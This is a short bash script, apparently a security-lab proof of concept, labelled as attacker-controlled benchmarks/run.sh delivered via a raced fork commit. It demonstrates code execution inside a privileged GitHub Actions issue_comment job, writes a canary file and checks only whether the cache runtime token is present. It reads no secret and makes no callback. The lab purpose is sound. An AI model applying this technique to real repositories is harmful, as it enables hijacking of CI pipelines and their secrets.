#!/usr/bin/env bash
# Attacker-controlled benchmarks/run.sh, delivered on the raced fork commit.
# PURPOSE (lab): prove arbitrary code execution inside the privileged, default-branch
# job that the issue_comment workflow runs. That is the whole vulnerability — once
# attacker code runs in a job that holds secrets and cache write access, secret/cache
# access follows by well-understood means. The lab intentionally does NOT read, hash,
# dump, or exfiltrate any secret. It only writes a fictional canary marker proving the
# execution context, and performs no network callback.
set -uo pipefail
echo "[attacker] code executing in privileged context as $(whoami) on $(hostname)"

CANARY_FILE="$(pwd)/LAB-PROOF.txt"
{
  echo "LAB_CANARY_7F3A executed"
  echo "context: default-branch job of ${GITHUB_REPOSITORY:-?} run ${GITHUB_RUN_ID:-?}"
  echo "event: ${GITHUB_EVENT_NAME:-?}"
  # Presence-only signal: does this job type expose the cache runtime token at all?
  # We record ONLY a yes/no, never the value, never a hash.
  if [ -n "${ACTIONS_RUNTIME_TOKEN:-}" ]; then
    echo "cache-write-context: YES (runtime token present to this job type)"
  else
    echo "cache-write-context: no (not present in this step)"
  fi
} | tee "$CANARY_FILE"

echo "[attacker] proof written to $CANARY_FILE (no secret read, no callback)"
exit 0
